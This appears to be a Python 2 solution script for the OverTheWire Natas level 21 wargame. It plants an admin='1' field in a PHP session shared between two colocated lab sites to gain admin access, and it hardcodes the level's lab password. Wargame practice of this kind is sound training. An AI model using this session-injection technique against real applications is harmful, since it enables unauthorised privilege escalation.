import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas21.natas.labs.overthewire.org/index.php?debug=1'
HOST_EXP = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1'
auth = HTTPBasicAuth('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')

r = requests.get(HOST, auth=auth)
cookies = dict(PHPSESSID=r.cookies['PHPSESSID'])
data = dict(align='lol', fontsize='100%', bgcolor='yellow', submit='Update', admin='1')
r = requests.post(HOST_EXP, data=data, cookies=cookies, auth=auth)
print r.content

r = requests.get(HOST, cookies=cookies, auth=auth)
print r.content


